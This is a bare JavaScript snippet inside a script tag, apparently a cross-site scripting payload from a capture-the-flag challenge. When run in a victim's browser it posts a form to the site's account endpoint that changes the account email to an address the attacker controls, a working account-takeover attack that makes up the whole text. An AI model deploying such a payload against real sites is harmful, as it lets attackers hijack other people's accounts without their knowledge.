<script>

var http = new XMLHttpRequest();
var url = "https://commonsensereviews.tpctf.tk/account";
var params = "email=r4m@protonmail.com&formbtn=Send+Request";
http.open("POST", url, true);

http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

http.onreadystatechange = function() {
    if(http.readyState == 4 && http.status == 200) {
        alert(http.responseText);
    }
}
http.send(params);
</script>